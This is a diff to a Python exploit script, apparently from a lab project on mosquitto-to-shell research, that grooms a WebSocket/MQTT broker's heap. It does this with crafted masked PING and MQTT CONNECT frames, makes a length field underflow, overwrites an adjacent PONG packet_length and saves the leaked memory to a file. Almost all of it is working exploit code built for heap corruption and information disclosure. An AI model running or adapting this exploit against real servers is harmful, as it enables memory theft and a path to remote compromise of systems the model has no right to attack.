@@ -59,10 +59,15 @@ def main():
         s.sendall(b"\x89\xfd" + MASK)  # masked PING, len 125, payload withheld
         holders.append(s)
     print("holders with partial PING:", len(holders))
+    # A pre-existing connection whose 0xc0 PONG can be allocated immediately
+    # after the source payload, so the two chunks are adjacent from top.
+    spare = connect(a.port)
 
     src = connect(a.port)
     # MQTT CONNECT fixed header, Remaining Length 174 (0xae 0x01), 172 body bytes
     src.sendall(masked_frame(0x82, bytes((0x10, 0xAE, 0x01)) + b"B" * 172))
+    time.sleep(a.delay)
+    spare.sendall(b"\x89\xfd" + MASK)  # PONG allocated right after source payload
     time.sleep(a.delay)
     # 1 phantom frame makes pos=0xb0/to_process underflow; 7 more walk to +0xcc
     src.sendall(masked_frame(0x82, b"") * 8)
@@ -70,8 +75,7 @@ def main():
     # Overwrite the adjacent PONG packet_length with 0x8000 + WS_PACKET_OFFSET(16)
     src.sendall(masked_frame(0x82, struct.pack("<I", 0x8010)))
     time.sleep(a.delay)
-    # Complete the last holder's held PING: that holder receives the enlarged PONG
-    victim = holders[-1]
+    victim = spare
     victim.sendall(MASK + b"P" * 125)
     time.sleep(0.6)
 
@@ -94,7 +98,7 @@ def main():
     print("first 48 bytes:", repr(data[:48]))
     print("frame header hint:", data[:4].hex() if data else "none")
     open("/home/mesh-home/mishe-tauftauf2shell/lab/frontier/mosquitto2shell/logs/pong-leak.bin", "wb").write(data)
-    for s in holders + [src]:
+    for s in holders + [spare, src]:
         s.close()
 
 
